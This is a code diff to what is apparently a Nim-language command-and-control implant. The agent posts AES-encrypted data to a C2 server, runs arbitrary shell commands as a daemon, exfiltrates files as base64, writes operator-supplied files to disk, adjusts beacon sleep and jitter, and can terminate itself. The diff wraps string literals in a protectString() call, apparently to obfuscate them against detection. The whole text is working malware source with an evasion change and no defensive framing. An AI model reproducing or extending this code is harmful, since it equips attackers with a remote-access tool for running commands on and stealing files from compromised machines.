@@ -32,7 +32,7 @@ let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
 
 
 proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool =
-    var data_to_send = """{"command_type": """" & command_type & """", "data": """ & data_dict & "}"
+    var data_to_send = protectString("""{"command_type": """") & command_type & protectString("""", "data": """) & data_dict & "}"
     try:
         discard client.post(c2_url, body=encrypt_cbc(data_to_send, communication_aes_key, communication_aes_iv))
         return true
@@ -48,7 +48,7 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool =
     (output, retval) = execCmdEx(shell_command, options={poDaemon})
     
     if retval != 0:
-        output = "Error: shell return value = " & $retval 
+        output = protectString("Error: shell return value = ") & $retval 
         is_success = false 
 
     var data = {
@@ -74,8 +74,8 @@ proc exfil_file*(client: HttpClient, file_path: string): bool =
         is_success = false
     
     var data = {
-        "is_success": $is_success,
-        "file_path": file_path,
+        protectString("is_success"): $is_success,
+        protectString("file_path"): file_path,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable()
     
@@ -97,7 +97,7 @@ proc write_file*(client: HttpClient, file_data_base64: string, file_path: string
         is_success = true
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("file_upload_path"): file_path,
     }.toOrderedTable()
     
@@ -122,7 +122,7 @@ proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int
 
 proc kill_agent*(client: HttpClient): void =
     
-    discard post_data(client, protectString("kill") , """{"Good bye": ":("}""")
+    discard post_data(client, protectString("kill") , protectString("""{"Good bye": ":("}"""))
     quit()
 
 
